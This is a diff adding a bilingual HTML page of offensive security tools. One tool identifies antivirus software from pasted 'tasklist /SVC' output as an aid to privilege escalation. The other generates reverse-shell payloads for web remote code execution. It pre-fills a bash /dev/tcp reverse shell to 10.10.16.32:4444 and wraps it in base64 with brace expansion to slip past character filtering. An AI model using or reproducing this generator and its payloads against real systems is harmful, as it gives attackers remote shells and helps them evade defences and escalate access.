@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <link rel="icon" href="favicon.ico">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cyber Security Tools</title>
+    <link rel="stylesheet" href="hacker_style.css">
+</head>
+
+<body>
+    <div class="container">
+        <header>
+            <div class="lang-switch">
+                <button class="lang-btn" onclick="toggleLanguage()">[ CN / EN ]</button>
+            </div>
+            <h1 class="glitch" data-text="CYBER SECURITY TOOLS" data-i18n="mainTitle">CYBER SECURITY TOOLS</h1>
+            <h3 data-i18n="subTitle">Cyber Security Tools</h3>
+
+            <div class="tabs">
+                <button class="tab-button active" onclick="openTab('av-scan')" data-i18n="tabAV">AV RECOGNITION</button>
+                <button class="tab-button" onclick="openTab('rev-shell')" data-i18n="tabShell">REVERSE SHELL</button>
+            </div>
+        </header>
+
+        <!-- AV SCAN SECTION -->
+        <section id="av-scan" class="tool-section active">
+            <div class="description" style="text-align: center; margin-bottom: 20px;">
+                <p data-i18n="avDesc">在线识别杀毒软件 / 辅助提权</p>
+
+            </div>
+            <form id="scan-form">
+                <textarea name="user_input" id="user_input" data-i18n-placeholder="avPlaceholder"
+                    placeholder="在此输入 tasklist /SVC 命令的执行结果..."></textarea>
+
+                <div class="command-container">
+                    <input type="text" id="commandInput" readonly>
+                    <button type="button" class="copy-button" data-copy-target="cmd" data-i18n="copyCmd">
+                        COPY CMD
+                    </button>
+                </div>
+
+                <div class="command-container">
+                    <input type="text" id="psCommandInput" readonly>
+                    <button type="button" class="copy-button" data-copy-target="ps" data-i18n="copyPs">
+                        COPY POWERSHELL
+                    </button>
+                </div>
+
+                <div class="button-group" style="display: flex; gap: 15px;">
+                    <button type="submit" class="submit-button" data-i18n="analyzeBtn">
+                        <i class="fas fa-search"></i> ANALYZE
+                    </button>
+                    <button type="button" id="clear-button" class="clear-button" data-i18n="clearBtn">
+                        <i class="fas fa-trash-alt"></i> CLEAR
+                    </button>
+                </div>
+            </form>
+
+            <!-- 结果显示区域 -->
+            <div class="results-section" style="display: none;">
+                <div class="results-header">
+                    <h2 data-i18n="resultsTitle"><i class="fas fa-shield-alt"></i> ANALYSIS RESULTS</h2>
+                </div>
+                <div class="result"></div>
+            </div>
+        </section>
+
+        <!-- REVERSE SHELL SECTION -->
+        <section id="rev-shell" class="tool-section hidden">
+            <div class="description" style="text-align: center; margin-bottom: 20px;">
+                <p data-i18n="shellDesc">Web RCE 反向Shell Payload生成器</p>
+                <p data-i18n="shellSubDesc">解决特殊字符转义、阻塞式I/O导致反弹失败的问题</p>
+            </div>
+
+            <div>
+                <label for="inputCommand" data-i18n="inputLabel">输入您的标准反向Shell命令:</label>
+                <textarea id="inputCommand" placeholder="bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"></textarea>
+            </div>
+
+            <div class="button-container" style="margin-top: 20px; text-align: center;">
+                <button id="encodeButton" data-i18n="generateBtn">GENERATE PAYLOAD</button>
+            </div>
+
+            <div class="output-container" style="margin-top: 20px; position: relative;">
+                <label for="outputPayload" data-i18n="outputLabel">生成的Payload:</label>
+                <textarea id="outputPayload" readonly></textarea>
+                <button id="copyPayloadButton" class="copy-button"
+                    style="position: absolute; top: 35px; right: 10px; border: 1px solid var(--border-color);"
+                    data-i18n="copyBtn">COPY</button>
+            </div>
+        </section>
+
+        <div class="footer">
+            <p><b>V1.0</b></p>
+        </div>
+    </div>
+
+    <script>
+        // --- I18N CONFIG ---
+        const i18n = {
+            cn: {
+                mainTitle: "CYBER SECURITY TOOLS",
+                subTitle: "sadsec",
+                tabAV: "杀软识别",
+                tabShell: "反弹SHELL",
+                avDesc: "在线识别杀毒软件 / 辅助提权",
+                avPlaceholder: "在此输入 tasklist /SVC 命令的执行结果...",
+                copyCmd: "复制 CMD 命令",
+                copyPs: "复制 PowerShell 命令",
+                analyzeBtn: "提交分析",
+                clearBtn: "清空内容",
+                resultsTitle: "分析结果",
+                shellDesc: "Web RCE 反向Shell Payload生成器",
+                shellSubDesc: "解决特殊字符转义、阻塞式I/O导致反弹失败的问题",
+                inputLabel: "输入您的标准反向Shell命令:",
+                generateBtn: "生成 Payload",
+                outputLabel: "生成的 Payload:",
+                copyBtn: "复制",
+                noMatch: "未找到匹配的进程，如有漏报欢迎提交至我们的开源项目",
+                clickDetails: "点击查看详情",
+                loadError: "杀软数据加载失败: ",
+                inputEmpty: "请输入需要编码的命令。",
+                encodeError: "编码失败: ",
+                copied: "已复制!"
+            },
+            en: {
+                mainTitle: "CYBER SECURITY TOOLS",
+                subTitle: "YuanLong Sec Team",
+                tabAV: "AV RECOGNITION",
+                tabShell: "REVERSE SHELL",
+                avDesc: "Online Antivirus Recognition / Privilege Escalation Aid",
+                avPlaceholder: "Paste 'tasklist /SVC' output here...",
+                copyCmd: "COPY CMD",
+                copyPs: "COPY POWERSHELL",
+                analyzeBtn: "ANALYZE",
+                clearBtn: "CLEAR",
+                resultsTitle: "ANALYSIS RESULTS",
+                shellDesc: "Web RCE Reverse Shell Payload Generator",
+                shellSubDesc: "Solves issues with special char escaping & blocking I/O",
+                inputLabel: "Enter your standard reverse shell command:",
+                generateBtn: "GENERATE PAYLOAD",
+                outputLabel: "Generated Payload:",
+                copyBtn: "COPY",
+                noMatch: "No matching processes found. Report missing AVs to our repo.",
+                clickDetails: "Click for details",
+                loadError: "Failed to load AV data: ",
+                inputEmpty: "Please enter a command to encode.",
+                encodeError: "Encoding failed: ",
+                copied: "COPIED!"
+            }
+        };
+
+        let currentLang = 'cn';
+
+        function toggleLanguage() {
+            currentLang = currentLang === 'cn' ? 'en' : 'cn';
+            updateLanguage();
+        }
+
+        function updateLanguage() {
+            const texts = i18n[currentLang];
+            document.querySelectorAll('[data-i18n]').forEach(el => {
+                const key = el.getAttribute('data-i18n');
+                if (texts[key]) el.innerText = texts[key];
+            });
+            document.querySelectorAll('[data-i18n-placeholder]').forEach(el => {
+                const key = el.getAttribute('data-i18n-placeholder');
+                if (texts[key]) el.placeholder = texts[key];
+            });
+
+            // Update dynamic content if needed (e.g. button texts that were changed by JS)
+            // This is handled by re-rendering or checking state, but for now static text update is enough.
+        }
+
+        // --- TAB LOGIC ---
+        function openTab(tabId) {
+            document.querySelectorAll('.tool-section').forEach(s => s.classList.add('hidden'));
+            document.querySelectorAll('.tool-section').forEach(s => s.classList.remove('active'));
+
+            document.querySelectorAll('.tab-button').forEach(b => b.classList.remove('active'));
+
+            document.getElementById(tabId).classList.remove('hidden');
+            document.getElementById(tabId).classList.add('active');
+
+            // Find button
+            const buttons = document.querySelectorAll('.tab-button');
+            for (let btn of buttons) {
+                if (btn.getAttribute('onclick').includes(tabId)) {
+                    btn.classList.add('active');
+                    break;
+                }
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            // --- AV SCAN LOGIC ---
+            const form = document.getElementById('scan-form');
+            const userInput = document.getElementById('user_input');
+            const commandInput = document.getElementById('commandInput');
+            const psCommandInput = document.getElementById('psCommandInput');
+            const resultsSection = document.querySelector('.results-section');
+            const resultsContainer = document.querySelector('.result');
+            const clearButton = document.getElementById('clear-button');
+
+            let avData = null;
+            let dataPromise = null;
+            const commands = {
+                cmd: 'tasklist /SVC',
+                ps: 'Get-WmiObject Win32_Process | Where-Object {$_.Name -like "*.exe"} | Select-Object Name, ProcessId'
+            };
+
+            commandInput.value = commands.cmd;
+            psCommandInput.value = commands.ps;
+
+            const escapeHtml = (text = '') => text
+                .replace(/&/g, '&amp;')
+                .replace(/</g, '&lt;')
+                .replace(/>/g, '&gt;')
+                .replace(/"/g, '&quot;')
+                .replace(/'/g, '&#39;');
+
+            const copyToClipboard = (text, btnElement) => {
+                if (navigator.clipboard && window.isSecureContext) {
+                    navigator.clipboard.writeText(text).then(() => showCopyFeedback(btnElement));
+                    return;
+                }
+                const tempInput = document.createElement('input');
+                tempInput.value = text;
+                document.body.appendChild(tempInput);
+                tempInput.select();
+                document.execCommand('copy');
+                document.body.removeChild(tempInput);
+                showCopyFeedback(btnElement);
+            };
+
+            const showCopyFeedback = (btn) => {
+                if (!btn) return;
+                const originalText = btn.innerText;
+                btn.innerText = i18n[currentLang].copied;
+                setTimeout(() => btn.innerText = originalText, 1500);
+            };
+
+            const formatInputLines = rawText => {
+                const formatted = [];
+                rawText.split(/\r?\n/).forEach(line => {
+                    const trimmed = line.trim();
+                    if (!trimmed) return;
+                    if (trimmed.includes(' KB ')) {
+                        const parts = trimmed.split('KB');
+                        parts.forEach((part, index) => {
+                            const segment = part.trim();
+                            if (segment || index < parts.length - 1) {
+                                formatted.push(segment + (index < parts.length - 1 ? 'KB' : ''));
+                            }
+                        });
+                        return;
+                    }
+                    if (trimmed.includes(' K ')) {
+                        const parts = trimmed.split('K');
+                        parts.forEach((part, index) => {
+                            const segment = part.trim();
+                            if (segment || index < parts.length - 1) {
+                                formatted.push(segment + (index < parts.length - 1 ? 'K' : ''));
+                            }
+                        });
+                        return;
+                    }
+                    formatted.push(trimmed);
+                });
+                return formatted;
+            };
+
+            const findMatches = (lines, data) => {
+                const matches = new Map();
+                const entries = Object.entries(data);
+
+                lines.forEach(line => {
+                    const normalizedLine = line.toLowerCase();
+                    entries.forEach(([name, details]) => {
+                        details.processes.forEach(process => {
+                            if (!process) return;
+                            if (normalizedLine.startsWith(process.toLowerCase())) {
+                                if (!matches.has(name)) {
+                                    matches.set(name, { url: details.url, processes: new Set() });
+                                }
+                                matches.get(name).processes.add(process);
+                            }
+                        });
+                    });
+                });
+
+                return matches;
+            };
+
+            const renderMatches = matches => {
+                resultsContainer.innerHTML = '';
+
+                if (!matches.size) {
+                    resultsContainer.innerHTML = `<p>${i18n[currentLang].noMatch}</p>`;
+                    resultsSection.style.display = 'block';
+                    return;
+                }
+
+                matches.forEach((details, softwareName) => {
+                    const p = document.createElement('p');
+                    const processes = Array.from(details.processes).map(escapeHtml).join(', ');
+                    p.innerHTML = `<strong>${escapeHtml(softwareName)}:</strong> ${processes} ==> <a href="${escapeHtml(details.url)}" target="_blank">${i18n[currentLang].clickDetails}</a>`;
+                    resultsContainer.appendChild(p);
+                });
+
+                resultsSection.style.display = 'block';
+            };
+
+            const renderError = message => {
+                resultsContainer.innerHTML = `<p style="color: var(--secondary-color);">${escapeHtml(message)}</p>`;
+                resultsSection.style.display = 'block';
+            };
+
+            const loadData = () => {
+                if (!dataPromise) {
+                    dataPromise = (async () => {
+                        try {
+                            const response = await fetch('auto.json', { cache: 'no-store' });
+                            if (!response.ok) throw new Error('无法获取 auto.json');
+                            avData = await response.json();
+                        } catch (err) {
+                            renderError(i18n[currentLang].loadError + err.message);
+                            throw err;
+                        }
+                    })();
+                }
+                return dataPromise;
+            };
+
+            form.addEventListener('submit', async event => {
+                event.preventDefault();
+                try {
+                    await loadData();
+                } catch (err) { return; }
+
+                if (!avData) {
+                    renderError(i18n[currentLang].loadError);
+                    return;
+                }
+
+                const lines = formatInputLines(userInput.value || '');
+                const matches = findMatches(lines, avData);
+                renderMatches(matches);
+            });
+
+            clearButton.addEventListener('click', () => {
+                userInput.value = '';
+                resultsContainer.innerHTML = '';
+                resultsSection.style.display = 'none';
+            });
+
+            document.querySelectorAll('[data-copy-target]').forEach(button => {
+                button.addEventListener('click', () => {
+                    const target = button.dataset.copyTarget;
+                    copyToClipboard(commands[target] || '', button);
+                });
+            });
+
+            loadData(); // Preload data
+
+            // --- REVERSE SHELL LOGIC ---
+            const encodeButton = document.getElementById('encodeButton');
+            const copyPayloadButton = document.getElementById('copyPayloadButton');
+            const inputCommand = document.getElementById('inputCommand');
+            const outputPayload = document.getElementById('outputPayload');
+
+            // Default value
+            inputCommand.value = "bash -c 'bash -i >& /dev/tcp/10.10.16.32/4444 0>&1'";
+
+            encodeButton.addEventListener('click', () => {
+                const command = inputCommand.value.trim();
+                if (!command) {
+                    outputPayload.value = i18n[currentLang].inputEmpty;
+                    return;
+                }
+
+                try {
+                    const base64Command = btoa(command);
+                    const finalPayload = `bash -c {echo,${base64Command}}|{base64,-d}|{bash,-i}`;
+                    outputPayload.value = finalPayload;
+                } catch (error) {
+                    outputPayload.value = i18n[currentLang].encodeError + error.message;
+                }
+            });
+
+            copyPayloadButton.addEventListener('click', () => {
+                const payload = outputPayload.value;
+                if (!payload) return;
+                copyToClipboard(payload, copyPayloadButton);
+            });
+
+            // Initialize Language
+            updateLanguage();
+        });
+    </script>
+</body>
+
+</html>
